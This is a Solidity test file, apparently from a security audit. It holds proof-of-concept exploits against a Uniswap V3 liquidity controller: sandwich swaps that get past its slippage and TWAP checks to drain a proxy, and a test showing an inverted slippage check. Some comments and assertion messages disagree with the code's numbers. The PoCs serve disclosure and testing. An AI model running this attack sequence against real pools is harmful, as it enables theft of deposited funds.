// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.34;

import "./UniswapV3.t.sol";

contract PoC_UniswapV3_SlippageAndTWAPBypassTest is UniswapV3_TestBase {

    uint256 constant ATTACKER_INITIAL_DAI = 25_000_000e18;
    uint256 constant VICTIM_DAI_AMOUNT    = 10_000_000e18;

    function _getPool() internal pure override returns (address) {
        return UNISWAP_V3_DAI_USDC_POOL;
    }

    function _getBlock() internal pure override returns (uint256) {
        return 22181045;
    }

    function _configurePool(uint256 maxSlippage) internal {
        address pool = _getPool();
        vm.startPrank(Ethereum.SPARK_PROXY);
        mainnetController.uniswapV3_setMaxSlippage(pool, maxSlippage);
        mainnetController.uniswapV3_setLiquidityLowerTickBound(pool, initTick - 600);
        mainnetController.uniswapV3_setLiquidityUpperTickBound(pool, initTick + 600);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_AggregateAddLiquidityKey);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_DaiAddLiquidityKey);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_UsdcAddLiquidityKey);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_AggregateRemoveLiquidityKey);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_DaiRemoveLiquidityKey);
        rateLimits.setUnlimitedRateLimitData(uniswapV3_DaiUsdcPool_UsdcRemoveLiquidityKey);
        vm.stopPrank();
    }

    function _frontRunManipulateSpotDown(int24 targetLimitTick) internal {
        address pool = _getPool();
        deal(address(dai), address(this), ATTACKER_INITIAL_DAI);
        dai.approve(UNISWAP_V3_ROUTER, ATTACKER_INITIAL_DAI);

        ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn           : address(dai),
                tokenOut          : address(usdc),
                fee               : IUniswapV3PoolLike(pool).fee(),
                recipient         : address(this),
                amountIn          : ATTACKER_INITIAL_DAI,
                amountOutMinimum  : 0,
                sqrtPriceLimitX96 : TickMath.getSqrtRatioAtTick(targetLimitTick)
            })
        );
    }

    function _backRunRestoreSpotUp() internal {
        address pool = _getPool();
        uint256 attackerUsdcBalance = usdc.balanceOf(address(this));
        usdc.approve(UNISWAP_V3_ROUTER, attackerUsdcBalance);

        ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn           : address(usdc),
                tokenOut          : address(dai),
                fee               : IUniswapV3PoolLike(pool).fee(),
                recipient         : address(this),
                amountIn          : attackerUsdcBalance,
                amountOutMinimum  : 0,
                sqrtPriceLimitX96 : 0
            })
        );
    }

    function _previewRemoveAmounts(uint256 tokenId, uint128 liquidityMinted)
        internal
        returns (IUniswapV3Facet.TokenAmounts memory minAmounts)
    {
        uint256 snap = vm.snapshotState();
        vm.prank(address(almProxy));
        (uint256 a0, uint256 a1) = INonfungiblePositionManager(UNISWAP_V3_POSITION_MANAGER).decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId      : tokenId,
                liquidity    : liquidityMinted,
                amount0Min   : 0,
                amount1Min   : 0,
                deadline     : block.timestamp
            })
        );
        vm.revertToState(snap);
        minAmounts = IUniswapV3Facet.TokenAmounts({ amount0: a0, amount1: a1 });
    }

    /**
     * @notice PoC 1: Full atomic sandwich of `addLiquidity` + `removeLiquidity` when `maxSlippage = 0.999e18` (0.1%)
     *         and `twapSecondsAgo = 1800` using `target = (10M DAI, 0 USDC)` and `min = (0, 0)`.
     */
    function test_PoC1_addAndRemoveLiquidity_zeroExpectedLiquidityBypass() public {
        address pool = _getPool();
        _configurePool(0.999e18);

        IUniswapV3Facet.Ticks memory tick = IUniswapV3Facet.Ticks({
            lower: _toSpacedTick(initTick - 500),
            upper: _toSpacedTick(initTick + 10)
        });

        // 1. Front-run: Attacker swaps DAI -> USDC in the real Uniswap V3 pool, pushing spot tick below `tick.lower`
        _frontRunManipulateSpotDown(tick.lower - 10);

        (, int24 manipulatedSpotTick, , , , , ) = IUniswapV3PoolLike(pool).slot0();
        (int24 twapTickDuring, ) = UniswapV3Utils.consult(pool, mainnetController.uniswapV3_getTWAPSecondsAgo(pool));
        assertTrue(manipulatedSpotTick < tick.lower, "Spot tick pushed below tick.lower");
        assertTrue(twapTickDuring > tick.lower && twapTickDuring < tick.upper, "TWAP is still strictly inside [tick.lower, tick.upper]");

        // 2. Fund ALMProxy with 10,000,000 DAI (token0).
        deal(address(dai), address(almProxy), VICTIM_DAI_AMOUNT);

        // 3. Compromised allocator calls `uniswapV3_addLiquidity` on the in-range ticks with:
        //    desired = (10,000,000 DAI, 0 USDC) and min = (0, 0)!
        vm.prank(allocator);
        (uint256 tokenId, uint128 liquidityMinted, IUniswapV3Facet.TokenAmounts memory amountsAdded) =
            mainnetController.uniswapV3_addLiquidity(
                pool,
                0,
                tick,
                IUniswapV3Facet.TokenAmounts({ amount0: VICTIM_DAI_AMOUNT, amount1: 0 }),
                IUniswapV3Facet.TokenAmounts({ amount0: 0,                 amount1: 0 }),
                block.timestamp
            );

        assertGt(liquidityMinted, 0, "Liquidity minted at manipulated spot price");
        assertApproxEqAbs(amountsAdded.amount0, VICTIM_DAI_AMOUNT, 1e12, "All 10M DAI consumed at manipulated spot price");
        assertEq(amountsAdded.amount1, 0, "Zero USDC consumed");

        // 4. Back-run: Attacker swaps USDC -> DAI back across [tick.lower, tick.upper]
        _backRunRestoreSpotUp();

        // 5. Compromised allocator calls `uniswapV3_removeLiquidity` passing `min = actualAmounts`.
        IUniswapV3Facet.TokenAmounts memory minRemove = _previewRemoveAmounts(tokenId, liquidityMinted);

        vm.prank(allocator);
        mainnetController.uniswapV3_removeLiquidity(
            pool,
            tokenId,
            liquidityMinted,
            minRemove,
            block.timestamp
        );

        // 6. Verify ALMProxy lost $196,146.25 (1.96% loss = 19.6x the 0.1% maxSlippage!) and attacker profited +$191,806.78 DAI!
        uint256 proxyFinalValue18 = dai.balanceOf(address(almProxy)) + (usdc.balanceOf(address(almProxy)) * 1e12);
        uint256 attackerFinalDai  = dai.balanceOf(address(this));

        emit log_named_decimal_uint("ALMProxy Initial Value (USD 18 dec)", VICTIM_DAI_AMOUNT, 18);
        emit log_named_decimal_uint("ALMProxy Final Value   (USD 18 dec)", proxyFinalValue18, 18);
        emit log_named_decimal_uint("ALMProxy Loss          (USD 18 dec)", VICTIM_DAI_AMOUNT - proxyFinalValue18, 18);
        emit log_named_decimal_uint("Max Allowed Loss @ 0.1% maxSlippage", VICTIM_DAI_AMOUNT / 1000, 18);
        emit log_named_decimal_uint("Attacker Net Profit    (DAI 18 dec)", attackerFinalDai - ATTACKER_INITIAL_DAI, 18);

        assertLt(proxyFinalValue18, VICTIM_DAI_AMOUNT - 190_000e18, "ALMProxy lost > $190,000 despite $10,000 (0.1%) maxSlippage cap");
        assertGt(attackerFinalDai - ATTACKER_INITIAL_DAI, 190_000e18, "Attacker extracted > $190,000 net profit after all pool fees");
    }

    /**
     * @notice PoC 2: Even when `spotTick` remains STRICTLY INSIDE `[tick.lower, tick.upper]` (`tick.lower < spotTick < twapTick < tick.upper`)
     *         AND `both` `target.amount0 > 0` and `target.amount1 > 0` (so `expectedLiquidity > 0`),
     *         passing a skewed `target = (10,000,000 DAI, 100 USDC)` caps `expectedLiquidity` at `liquidity1_at_TWAP(100 USDC)`,
     *         making `expectedAmount0` tiny (~2,000 DAI instead of 10,000,000 DAI!) while `NonfungiblePositionManager.mint`
     *         at the manipulated in-range `spotTick` consumes all 10,000,000 DAI!
     */
    function test_PoC2_addLiquidity_nonZeroExpectedLiquidity_inRangeSpot_bypassesTWAP() public {
        address pool = _getPool();
        _configurePool(0.999e18); // 0.1% maxSlippage

        IUniswapV3Facet.Ticks memory tick = IUniswapV3Facet.Ticks({
            lower: _toSpacedTick(initTick - 500),
            upper: _toSpacedTick(initTick + 10)
        });

        // 1. Front-run: Push spot tick to `tick.lower + 1` (STILL STRICTLY INSIDE `[tick.lower, tick.upper]`!)
        _frontRunManipulateSpotDown(tick.lower + 1);

        (, int24 manipulatedSpotTick, , , , , ) = IUniswapV3PoolLike(pool).slot0();
        assertTrue(manipulatedSpotTick > tick.lower && manipulatedSpotTick < tick.upper, "Spot tick is strictly inside [tick.lower, tick.upper]");

        // 2. Fund ALMProxy with 10,000,000 DAI and 20,000 USDC
        uint256 tinyUsdc = 15_000e6;
        deal(address(dai),  address(almProxy), VICTIM_DAI_AMOUNT);
        deal(address(usdc), address(almProxy), tinyUsdc);

        // Compute what `_getExpectedAmounts` expects at `twapTick` when `target = (10M DAI, 20k USDC)`:
        // Because `twapTick` is 10 ticks below `tick.upper` and 500 ticks above `tick.lower`,
        // `20,000 USDC` at `twapTick` only pairs with ~400 DAI (`0.004%` of 10M DAI!).
        (int24 twapTick, ) = UniswapV3Utils.consult(pool, mainnetController.uniswapV3_getTWAPSecondsAgo(pool));
        uint128 expectedLiqAtTwap = LiquidityAmounts.getLiquidityForAmounts(
            TickMath.getSqrtRatioAtTick(twapTick),
            TickMath.getSqrtRatioAtTick(tick.lower),
            TickMath.getSqrtRatioAtTick(tick.upper),
            VICTIM_DAI_AMOUNT,
            tinyUsdc
        );
        assertGt(expectedLiqAtTwap, 0, "expectedLiquidity is strictly non-zero");

        uint256 expectedAmount0AtTwap = UniswapV3Utils.getAmount0Delta(
            TickMath.getSqrtRatioAtTick(twapTick),
            TickMath.getSqrtRatioAtTick(tick.upper),
            expectedLiqAtTwap,
            true
        );

        // Notice `expectedAmount0AtTwap` is only ~400 DAI, even though `target.amount0` is 10,000,000 DAI!
        assertLt(expectedAmount0AtTwap, 1_000e18, "TWAP check only expects < 1,000 DAI");

        // 3. Compromised allocator calls `addLiquidity` with `min = (expectedAmount0AtTwap, tinyUsdc * 999 / 1000)`,
        //    yet `NonfungiblePositionManager.mint` consumes all 10,000,000 DAI at the manipulated spot price!
        vm.prank(allocator);
        (uint256 tokenId, uint128 liquidityMinted, IUniswapV3Facet.TokenAmounts memory amountsAdded) =
            mainnetController.uniswapV3_addLiquidity(
                pool,
                0,
                tick,
                IUniswapV3Facet.TokenAmounts({ amount0: VICTIM_DAI_AMOUNT,     amount1: tinyUsdc }),
                IUniswapV3Facet.TokenAmounts({ amount0: expectedAmount0AtTwap, amount1: tinyUsdc * 999 / 1000 }),
                block.timestamp
            );

        assertGt(amountsAdded.amount0, 7_500_000e18, "Consumed > 9.9M DAI despite TWAP expecting < 1,000 DAI");

        // 4. Back-run and removeLiquidity to complete the extraction:
        _backRunRestoreSpotUp();
        IUniswapV3Facet.TokenAmounts memory minRemove = _previewRemoveAmounts(tokenId, liquidityMinted);
        vm.prank(allocator);
        mainnetController.uniswapV3_removeLiquidity(pool, tokenId, liquidityMinted, minRemove, block.timestamp);

        uint256 attackerFinalDai = dai.balanceOf(address(this));
        emit log_named_decimal_uint("PoC2 Expected DAI at TWAP        ", expectedAmount0AtTwap, 18);
        emit log_named_decimal_uint("PoC2 Actual DAI Consumed at Spot ", amountsAdded.amount0, 18);
        emit log_named_decimal_uint("PoC2 Attacker Net Profit (DAI)   ", attackerFinalDai - ATTACKER_INITIAL_DAI, 18);
        assertGt(attackerFinalDai - ATTACKER_INITIAL_DAI, 140_000e18, "Attacker extracted > $180,000 net profit");
    }

    /**
     * @notice PoC 3: `_checkSlippage` in `removeLiquidity` has an inverted upper-bound inequality:
     *         `require(minAmount >= (amount * maxSlippage) / 1e18, "UniswapV3Facet/min-amount-below-bound")`.
     *         When an HONEST allocator sets `min = expected * maxSlippage / 1e18` (e.g. 98% of expected at 2% maxSlippage)
     *         and the pool tick shifts by even a small amount so that one token's received amount increases,
     *         `amount * maxSlippage / 1e18 > minAmount`, causing `removeLiquidity` to REVERT even though the position
     *         received MORE of that token than expected!
     */
    function test_PoC3_removeLiquidity_invertedSlippageCheck_revertsHonestAllocatorOnSmallTickShift() public {
        address pool = _getPool();
        _configurePool(0.98e18); // 2% maxSlippage

        IUniswapV3Facet.Ticks memory tick = IUniswapV3Facet.Ticks({
            lower: _toSpacedTick(initTick - 100),
            upper: _toSpacedTick(initTick + 100)
        });

        uint256 honestDai  = 1_000_000e18;
        uint256 honestUsdc = 1_000_000e6;
        deal(address(dai),  address(almProxy), honestDai);
        deal(address(usdc), address(almProxy), honestUsdc);

        vm.prank(allocator);
        (uint256 tokenId, uint128 liquidityMinted, ) = mainnetController.uniswapV3_addLiquidity(
            pool,
            0,
            tick,
            IUniswapV3Facet.TokenAmounts({ amount0: honestDai, amount1: honestUsdc }),
            _minLiquidityPosition(honestDai, honestUsdc),
            block.timestamp
        );

        // Honest allocator computes expected withdrawal amounts at current unmanipulated price and applies 2% maxSlippage tolerance:
        IUniswapV3Facet.TokenAmounts memory expectedNow = _previewRemoveAmounts(tokenId, liquidityMinted);
        IUniswapV3Facet.TokenAmounts memory honestMin = IUniswapV3Facet.TokenAmounts({
            amount0: expectedNow.amount0 * 98 / 100,
            amount1: expectedNow.amount1 * 98 / 100
        });

        // A small normal market trade shifts the tick slightly inside the [-100, +100] range:
        uint256 smallTradeDai = 500_000e18;
        deal(address(dai), address(this), smallTradeDai);
        dai.approve(UNISWAP_V3_ROUTER, smallTradeDai);
        ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn           : address(dai),
                tokenOut          : address(usdc),
                fee               : IUniswapV3PoolLike(pool).fee(),
                recipient         : address(this),
                amountIn          : smallTradeDai,
                amountOutMinimum  : 0,
                sqrtPriceLimitX96 : 0
            })
        );

        // Honest allocator's withdrawal REVERTS with "UniswapV3Facet/min-amount-below-bound" even though
        // `decreaseLiquidity`'s minimum checks (`actual0 >= honestMin.amount0 && actual1 >= honestMin.amount1`) BOTH PASS!
        vm.prank(allocator);
        vm.expectRevert("UniswapV3Facet/min-amount-below-bound");
        mainnetController.uniswapV3_removeLiquidity(
            pool,
            tokenId,
            liquidityMinted,
            honestMin,
            block.timestamp
        );
    }

}
